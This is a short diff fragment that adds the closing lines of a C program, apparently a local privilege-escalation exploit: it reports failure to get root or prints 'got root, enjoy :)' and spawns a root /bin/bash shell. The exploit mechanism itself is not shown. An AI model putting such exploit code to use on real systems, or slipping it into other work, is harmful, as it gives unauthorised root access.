+        printf("failed to get root :(\n");
+        exit(EXIT_FAILURE);
+    }
+
+    printf("got root, enjoy :)\n");
+    return execl("/bin/bash", "-sh", NULL);
+}
+            
